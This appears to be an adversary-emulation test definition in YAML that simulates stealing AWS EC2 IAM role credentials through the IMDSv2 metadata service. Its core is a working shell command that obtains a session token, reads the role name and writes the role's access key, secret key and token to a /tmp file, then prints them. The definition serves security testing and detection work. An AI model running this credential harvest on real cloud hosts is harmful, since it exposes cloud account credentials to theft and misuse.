---
- id: 667c55b1dc790302bc41606dbfa951aa
  name: AWS - Retrieve EC2 IAM Role Credentials via IMDSv2
  description: 'Simulates an adversary on a compromised EC2 instance abusing the Instance
    Metadata Service Version 2

    (IMDSv2) to steal the temporary IAM role credentials assigned to the instance.
    A session token is first

    requested with a PUT to `/latest/api/token`, then supplied in the `X-aws-ec2-metadata-token`
    header to

    read the instance''s IAM role name and retrieve that role''s `AccessKeyId`, `SecretAccessKey`,
    and `Token`

    from `/latest/meta-data/iam/security-credentials/`. The harvested credentials
    are written to a file.

    On a host that is not an EC2 instance the requests to the link-local 169.254.169.254
    address time out and

    no credentials are returned.

    See: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-v2-how-it-works.html

    '
  tactic: credential-access
  technique:
    attack_id: T1552.005
    name: 'Unsecured Credentials: Cloud Instance Metadata API'
  platforms:
    linux:
      sh:
        command: 'if [ -x "$(command -v curl)" ]; then : ; else if grep -iq "debian\|ubuntu\|kali\|mint"
          /usr/lib/os-release; then apt update && apt install -y curl; fi; if grep
          -iq "rhel\|fedora\|centos\|rocky\|alma" /usr/lib/os-release; then yum install
          -y curl; fi; fi;  token=$(curl -s --connect-timeout 2 -m 5 -X PUT "http://169.254.169.254/latest/api/token"
          -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"); role=$(curl -s --connect-timeout
          2 -m 5 -H "X-aws-ec2-metadata-token: $token" "http://169.254.169.254/latest/meta-data/iam/security-credentials/");
          curl -s --connect-timeout 2 -m 5 -H "X-aws-ec2-metadata-token: $token" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role"
          -o "/tmp/T1552.005_aws_imds_creds.json"; if [ -s "/tmp/T1552.005_aws_imds_creds.json"
          ]; then cat "/tmp/T1552.005_aws_imds_creds.json"; else echo "No IAM credentials
          returned (host is not an EC2 instance with an attached role)"; fi'
        payloads: []
        cleanup: rm -f "/tmp/T1552.005_aws_imds_creds.json"
    unknown:
      sh:
        command: 'if [ -x "$(command -v curl)" ]; then : ; else if grep -iq "debian\|ubuntu\|kali\|mint"
          /usr/lib/os-release; then apt update && apt install -y curl; fi; if grep
          -iq "rhel\|fedora\|centos\|rocky\|alma" /usr/lib/os-release; then yum install
          -y curl; fi; fi;  token=$(curl -s --connect-timeout 2 -m 5 -X PUT "http://169.254.169.254/latest/api/token"
          -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"); role=$(curl -s --connect-timeout
          2 -m 5 -H "X-aws-ec2-metadata-token: $token" "http://169.254.169.254/latest/meta-data/iam/security-credentials/");
          curl -s --connect-timeout 2 -m 5 -H "X-aws-ec2-metadata-token: $token" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role"
          -o "/tmp/T1552.005_aws_imds_creds.json"; if [ -s "/tmp/T1552.005_aws_imds_creds.json"
          ]; then cat "/tmp/T1552.005_aws_imds_creds.json"; else echo "No IAM credentials
          returned (host is not an EC2 instance with an attached role)"; fi'
        payloads: []
        cleanup: rm -f "/tmp/T1552.005_aws_imds_creds.json"
